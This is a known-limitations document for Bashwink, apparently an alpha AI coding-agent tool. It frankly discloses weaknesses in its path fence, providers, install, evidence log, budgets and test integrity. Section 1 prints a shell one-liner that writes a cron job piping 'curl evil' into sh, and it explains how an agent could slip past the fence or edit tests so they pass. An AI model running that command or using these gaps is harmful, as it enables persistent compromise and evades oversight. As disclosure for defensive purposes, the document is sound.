# Bashwink — Known Limitations

**Applies to:** the v0.1 alpha candidate, working tree at the time of writing.
**Read this before trusting any claim Bashwink makes about itself.**

Each entry states what is true, what the consequence is, and whether a workaround exists. Where
an item is a deliberate trade-off it says so; where it is simply unfinished it says that instead.
Nothing here is softened, because an alpha tester who discovers a limitation the docs hid has
been misled twice — once by the tool and once by its documents.

---

## 1. The security boundary is a guardrail, not a sandbox

**What is true.** BW-059 is implemented: a task's `allowedPaths` is enforced at the tool
boundary (`execute.before`), path traversal and symlink escapes are resolved physically, and an
untrusted workspace refuses writes and shell outright. Denials are recorded in the evidence chain
with the reason and the resolved target.

**What is not true.** It is not OS isolation. Specifically:

- **Shell commands are not path-bounded.** A permitted `shell` call can write anywhere an
  interpreter can reach: `python3 -c "open('/etc/passwd','w')"` is not detectable by inspecting
  the command string. Obvious path arguments and an out-of-scope `workdir` are refused, and
  every permitted shell call is recorded as `unconstrained` — that marker is the honest signal,
  not a formality.
- **A determined agent can still reach disk through any tool this policy does not know.** The
  fence classifies `write`, `edit`, `patch`, `read` and `shell`; an unknown tool is allowed.
  That is deliberate (blocking unrecognised tools would break the agent in ways that look like
  model errors) and is the wrong default for a hostile model.
- **Proof of the limit:** with `allowedPaths: ["src"]`, a model that was told to write outside
  the fence was blocked. A model that instead ran a shell one-liner would not have been. The
  concrete escape, which passes every check BW-059 makes:

  ```bash
  python3 -c "open('/etc/cron.d/x','w').write('* * * * * curl evil|sh')"
  ```

  No path argument looks outside the fence, and the working directory is in scope. The write
  happens inside the interpreter, where a policy that inspects command strings cannot see it.
  This is why no amount of additional string inspection closes the gap, and why the fix must be
  OS-level.

**Consequence.** Bashwink is safe to point at a repository you would let a careful contractor
touch, not at a machine you do not trust. Real isolation needs an OS-level sandbox (BW-031).

**Workaround.** Set a contract whose `forbiddenCommands` includes `shell`; the fence then refuses
every shell call and only file tools remain, which *are* path-bounded. This is the only setting
under which the current fence is a real boundary, and it costs you the agent's ability to run
tests — which is most of the value.

**Proposal for the fix.** `BW-031-SANDBOX-PROPOSAL.md` specifies a Seatbelt (macOS) + bubblewrap
(Linux) adapter built on the same `ScopePolicy`, with 21 negative tests covering interpreter
escapes, symlinks, credential reads, network egress and the failure-to-create-sandbox path. It
records that both Claude Code and Zed converged on those two primitives and stopped treating
Docker as the default, and it departs from BW-031's "Docker" wording deliberately — that needs
sign-off, not a silent reinterpretation. Feasibility was verified on this machine: a Seatbelt
profile denied outside writes and all network while permitting in-scope writes, and the
`/tmp` → `/private/tmp` resolved-path trap was reproduced before it could break real work.

---

## 2. Verified providers — one paid, one gateway

| Provider | Transport | Status |
| --- | --- | --- |
| CommandCode (`api.commandcode.ai`) | Anthropic Messages + OpenAI chat | **Verified end to end** — completions, tool calls, file edits, tests, model attribution |
| OpenCode gateway (`opencode/*`) | runtime-internal | **Verified** — but this is the runtime's own free catalogue, **not** a credential you configured |
| DeepSeek | — | **Not tested:** HTTP 402, insufficient balance |
| Ollama Cloud | — | **Not tested:** HTTP 402 |
| GitHub Copilot | device OAuth | **Not tested:** needs an interactive device flow |
| Local Ollama | — | **Not tested:** no daemon running |

**Consequence.** Multi-provider support is implemented and exercised across two wire protocols
on one provider, but "works with many providers" is **not** a verified claim. If your provider is
not in the first row, you are the first person to try it.

**Workaround.** `bashwink auth add` accepts any OpenAI-chat or Anthropic-Messages compatible
endpoint. `bashwink auth check <id>` tells you whether the credential resolves before you spend a
session finding out.

---

## 3. Windows is untested

**What is true.** Every verification run — local and CI — is macOS arm64 and Linux. CI has both
legs; Windows has none.

**Consequence.** Path containment is separator-aware (`/a/bc` is not inside `/a/b`), but the
Windows-specific behaviours are unexercised: drive letters, UNC paths, case-insensitive
filesystems, and whether `realpath` resolves junctions the way it resolves symlinks. A fence bug
on Windows would be a **security** bug, not a cosmetic one.

**Workaround.** None. Do not run the alpha on Windows expecting the fence to hold.

---

## 4. Installation is a build, not a package

**What is true.** `scripts/build_alpha.sh` produces a relocatable directory
(`bin/bashwink`, `lib/bashwink.js`, `lib/evidence/`) that runs outside the source checkout. This
is the supported path and it is verified.

**What is not true.** `npm install -g bashwink` does not work, and `bun add` of the packed
tarballs fails. `@bashwink/evidence` is `private: true` with a `workspace:*` dependency, so it
cannot resolve from a registry at all.

**Consequence.** Alpha testers need a checkout, Bun 1.4.4, and the pinned runtime. That is a
developer audience, not a user audience.

**Workaround.** Follow `ALPHA_TESTER_GUIDE.md`. Do not attempt a global npm install; it will
fail and the error will not explain why.

**Binary distribution.** There is no signed binary, no checksum manifest, and no notarisation.
Gatekeeper on macOS will complain about anything you build yourself.

---

## 5. Evidence integrity: tamper-evident, not tamper-proof

**What the chain proves.** That the entries present were not edited, deleted or reordered in
place — each entry hashes its predecessor.

**What it cannot prove.** That nothing was removed from the **end**. Anyone who can write to the
log can truncate it and the remaining prefix still verifies. And anyone with write access can
recompute an entirely consistent chain from scratch.

**What it does not cover.** The runtime's own logs, the SQLite database, and the working tree are
not chained. Bashwink's evidence is about what the agent *did*, not a proof about the repository.

**Consequence.** Treat the log as a high-quality audit trail, not as cryptographic proof of
authorship. If you need attested evidence, that is ProofPack (BW-060), which is unstarted.

---

## 6. Cost and runaway protection are absent

**What is true.** `session.usage.updated` events carry token counts and cost, and the evidence log
records them.

**What is not true.** Nothing stops a run. There is no budget, no turn ceiling, and no
no-progress detector. A model that loops will loop until you interrupt it.

**Consequence.** The first unattended run can be expensive. BudgetPilot is BW-075 and is
unstarted.

**Workaround.** Watch the first runs, and prefer `--standalone` so a single Ctrl-C ends it.

---

## 7. Test integrity is not protected

**What is true.** A TaskContract requires every declared check to have a passing observation
before a task can be marked `verified`, and the gate is enforced in the store as well as the CLI.

**What is not true.** Nothing stops the agent from **editing the test** so it passes. TestGuard
(BW-058) and the immutable baseline (BW-057) are unstarted.

**Consequence.** "Tests pass" can mean "the tests were changed". Every claim in
`TEST_EVIDENCE.md` about fixtures passing was produced by a human running them, not by the agent
under test — but a user's own runs are not protected this way.

---

## 8. Concurrency and sessions

- **One writer per evidence log.** There is no locking; two runs against the same
  `BASHWINK_HOME` can interleave. Sessions are per-directory in the runtime, and Bashwink does
  not add a second layer.
- **A killed session leaves the runtime's managed service behind**, holding its port; the next
  launch then fails during start-up. Bashwink now reads the runtime's log and reports this with
  the PID and how to clear it, rather than blaming the evidence plugin — but it cannot prevent
  it.
- **`--session` resumes across a model switch** and that is verified; concurrent sessions sharing
  one model map is handled per session, not per process.

---

## 9. Model and authentication coverage

- **No model aliases, fallback chains, or auxiliary-model routing.** Deliberate: each multiplies
  the model-attribution surface, and an automatic fallback would change which model made a change
  without the evidence saying so.
- **Wire protocol must be stated per model** when a provider serves more than one (e.g.
  `--model claude-sonnet-5:anthropic`). A provider-level package applies to every model, so a
  mixed provider must not have one. Getting this wrong fails at the first request, not at
  start-up.
- **OAuth-only providers (GitHub Copilot, and similar) are not supported by `bashwink auth`.**
  They require the runtime's own interactive login, and Bashwink does not wrap it.
- **`model list` reports the config, not the live catalogue.** `bashwink models` asks the
  runtime, and needs a server. The distinction is deliberate; a stale list presented as the
  catalogue would be an unverified claim.
- **No local-model runtime is bundled.** Ollama and vLLM work only through a
  provider that speaks one of the two supported protocols.

---

## 10. An unrecognised subcommand is forwarded to the runtime

`bashwink <typo>` passes the word to the runtime, which treats it as a directory and fails with
`chdir ... -> 'frobnicate'`. Bashwink now reports that honestly — "the runtime exited 1 before any
evidence was written, so no work is known to have happened" — and exits 1. It is still a poor
error, and there is no `sessions` subcommand (the runtime spells it `session`), so a user looking
for session management will hit this.

## 11. What the fence does not manage

- **The trust file is the real permission switch.** `bashwink trust <dir>` allows writes and
  shell in that workspace; an untrusted workspace is read-only regardless of any contract. Do not
  trust a directory you have not read.
- **`allowedPaths` from a contract are resolved relative to the run's working directory.** A run
  started from a subdirectory therefore fences that subdirectory's interpretation of the same
  paths. Start runs from the repository root.
- **The policy is written once per run.** A mid-run edit to `data/scope.json` does not change
  what the running plugin enforces — it read the policy at setup — but it will change the *next*
  run. Treat that file as part of the run's inputs, not as state.
